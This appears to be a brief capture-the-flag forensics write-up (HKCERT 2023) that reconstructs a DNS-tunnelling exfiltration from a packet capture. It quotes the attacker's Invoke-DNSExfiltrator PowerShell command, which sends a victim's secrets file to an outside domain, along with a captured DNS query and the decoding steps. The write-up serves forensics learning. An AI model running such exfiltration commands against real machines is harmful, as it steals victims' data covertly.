<https://file.hkcert23.pwnable.hk/yes-i-know-i-know_a60eb430a7151bf685dfc486c83947a9.zip>

### tcp.stream eq 51

```powershell
Invoke-DNSExfiltrator -i C:\Users\Tom\Desktop\secrets.txt.txt -d igotoschoolbybus.online -p 'K#2dF!8t@1qZ' -s 192.168.135.135
```


### udp.stream eq 64

```hexdump
00000000: 461e 0100 0001 0000 0000 0000 0469 6e69  F............ini
00000010: 741c 4f4e 5357 4734 5446 4f52 5a53 3435  t.ONSWG4TFORZS45
00000020: 4459 4f51 5848 4936 4455 5051 5a41 0662  DYOQXHI6DUPQZA.b
00000030: 6173 6536 3410 6967 6f74 6f73 6368 6f6f  ase64.igotoschoo
00000040: 6c62 7962 7573 066f 6e6c 696e 6500 0010  lbybus.online...
00000050: 0001                                     ..
```


### Decode

```sh
sudo python2 ./DNSExfiltrator/dnsexfiltrator.py -d 'igotoschoolbybus.online' -p 'K#2dF!8t@1qZ'

cat 64.dmp | nc -c -u localhost 53
cat 65.dmp | nc -c -u localhost 53
cat 66.dmp | nc -c -u localhost 53
```
